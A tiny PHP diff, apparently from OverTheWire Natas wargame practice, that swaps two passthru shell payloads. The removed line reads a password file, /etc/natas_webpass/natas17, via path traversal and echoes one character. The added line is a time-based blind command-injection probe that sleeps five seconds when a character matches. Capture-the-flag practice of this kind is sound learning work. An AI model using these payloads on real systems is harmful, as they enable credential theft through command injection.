@@ -1,3 +1,3 @@
 <?php
-    passthru("$(arr=($(cat ../../../../../../etc/natas_webpass/natas17))\r\nword=${arr[0]}\r\necho ${word: 1: 1})");
+    passthru("grep -i \"\$(if [ \$(arr=(\$(cat dict.txt))\nword=\${arr[0]}\necho \${word:0:1}) = h ]\nthen\nsleep 5\nfi)\" dict.txt");
 ?>
